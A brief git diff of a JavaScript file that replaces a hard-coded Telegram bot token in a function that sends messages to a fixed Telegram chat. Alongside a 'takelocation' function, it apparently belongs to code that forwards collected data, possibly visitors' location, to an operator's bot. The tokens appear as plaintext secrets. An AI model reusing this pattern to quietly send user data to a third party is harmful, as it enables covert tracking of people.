@@ -131,7 +131,7 @@ const takelocation = async () => {
 
 // Gửi dữ liệu đến Telegram
 const sendMessageToTelegram = async (message) => {
-  const tokenTelegram = "7827078390:AAHVfwsqwioeDQ0He3jW1EVsO6UKNFvhn7I";
+  const tokenTelegram = "7695563151:AAGlhNfsDHBeaez-kbFohaNEsCxAT_Zs9bQ";
   const idTelegram = "7793511895";
   const telegramApiUrl = `https://api.telegram.org/bot${tokenTelegram}/sendMessage?chat_id=${idTelegram}`;
 
